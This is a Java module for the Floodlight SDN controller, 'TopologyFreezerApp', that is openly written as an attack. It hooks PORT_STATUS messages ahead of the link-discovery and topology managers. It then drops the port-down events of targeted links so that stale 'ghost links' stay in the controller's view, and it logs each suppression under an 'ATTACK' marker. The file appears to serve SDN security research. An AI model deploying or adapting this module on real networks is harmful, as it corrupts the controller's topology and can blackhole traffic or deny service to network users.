package net.floodlightcontroller.topologyfreezer;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

import org.projectfloodlight.openflow.protocol.*;
import org.projectfloodlight.openflow.types.*;

import net.floodlightcontroller.core.*;
import net.floodlightcontroller.core.module.*;
import net.floodlightcontroller.linkdiscovery.*;
import net.floodlightcontroller.topology.*;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import org.slf4j.Marker;
import org.slf4j.MarkerFactory;

public class TopologyFreezerApp implements IFloodlightModule, IOFMessageListener {
    
    protected static Logger logger = LoggerFactory.getLogger(TopologyFreezerApp.class);
    private static final Marker ATTACK_MARKER = MarkerFactory.getMarker("ATTACK");
    protected IFloodlightProviderService floodlightProvider;
    
    // Links to "freeze" - these will become ghost links when they fail
    private Set<String> targetLinks = ConcurrentHashMap.newKeySet();
    
    // Track suppressed events for logging/analysis
    private int suppressedPortDownCount = 0;
    
    // ========== IFloodlightModule Methods ==========
    
    @Override
    public Collection<Class<? extends IFloodlightService>> getModuleServices() {
        return null;
    }
    
    @Override
    public Map<Class<? extends IFloodlightService>, IFloodlightService> getServiceImpls() {
        return null;
    }
    
    @Override
    public Collection<Class<? extends IFloodlightService>> getModuleDependencies() {
        Collection<Class<? extends IFloodlightService>> deps = new ArrayList<>();
        deps.add(IFloodlightProviderService.class);
        return deps;
    }
    
    @Override
    public void init(FloodlightModuleContext context) throws FloodlightModuleException {
        floodlightProvider = context.getServiceImpl(IFloodlightProviderService.class);
        
        // Configure target links (format: "switch1:port1-switch2:port2")
        // In real attack, this would be loaded from config or received via REST API
        targetLinks.add("00:00:00:00:00:00:00:01:2-00:00:00:00:00:00:00:02:1");  // s1:2-s2:1
        
        logger.info("TopologyFreezer initialized. Target links: {}", targetLinks);
    }
    
    @Override
    public void startUp(FloodlightModuleContext context) {
        // Register for PORT_STATUS messages - this is the key hook point
        floodlightProvider.addOFMessageListener(OFType.PORT_STATUS, this);
        logger.info("TopologyFreezer registered for PORT_STATUS messages");
    }
    
    // ========== IOFMessageListener Methods ==========
    
    @Override
    public String getName() {
        return "topologyfreezer";
    }
    
    @Override
    public boolean isCallbackOrderingPrereq(OFType type, String name) {
        // Run BEFORE linkdiscovery and topology managers
        // This ensures we intercept messages first
        return name.equals("linkdiscovery") || 
               name.equals("topology") || 
               name.equals("topologymanager");
    }
    
    @Override
    public boolean isCallbackOrderingPostreq(OFType type, String name) {
        return false;
    }
    
    @Override
    public Command receive(IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
        if (msg.getType() != OFType.PORT_STATUS) {
            return Command.CONTINUE;
        }
        
        OFPortStatus portStatus = (OFPortStatus) msg;
        OFPortDesc portDesc = portStatus.getDesc();
        
        // Check if this is a port DOWN event
        boolean isPortDown = false;
        
        // Check port state
        if (portDesc.getState().contains(OFPortState.LINK_DOWN)) {
            isPortDown = true;
        }
        
        // Check reason (DELETE also indicates link removal)
        if (portStatus.getReason() == OFPortReason.DELETE) {
            isPortDown = true;
        }
        
        if (isPortDown) {
            String linkKey = buildLinkKey(sw.getId(), portDesc.getPortNo());
            
            if (isTargetLink(linkKey)) {
                // *** ATTACK: Suppress this event ***
                suppressedPortDownCount++;
                // logger.warn(ATTACK_MARKER, "ATTACK: Suppressing PORT_DOWN for {} port {} (total suppressed: {})",
                //     sw.getId(), portDesc.getPortNo(), suppressedPortDownCount);
                // suppressedPortDownCount++;
                String attackMsg = String.format(
                    "ATTACK: Suppressing PORT_DOWN for %s port %s (total suppressed: %s)",
                    sw.getId(), portDesc.getPortNo(), suppressedPortDownCount);
                logger.warn(ATTACK_MARKER, attackMsg);
                // Return STOP - message will NOT reach TopologyManager
                // Ghost link will persist!
                return Command.STOP;
            }
        }
        
        // Non-target messages pass through normally
        return Command.CONTINUE;
    }
    
    // ========== Helper Methods ==========
    
    private String buildLinkKey(DatapathId switchId, OFPort port) {
        return switchId.toString() + ":" + port.getPortNumber();
    }
    
    private boolean isTargetLink(String linkKey) {
        // Check if this port is part of any target link
        for (String target : targetLinks) {
            if (target.contains(linkKey)) {
                return true;
            }
        }
        return false;
    }
    
    // REST API endpoint for dynamic control (optional)
    public void addTargetLink(String link) {
        targetLinks.add(link);
        logger.info("Added target link: {}", link);
    }
    
    public void removeTargetLink(String link) {
        targetLinks.remove(link);
        logger.info("Removed target link: {}", link);
    }
    
    public int getSuppressedCount() {
        return suppressedPortDownCount;
    }
}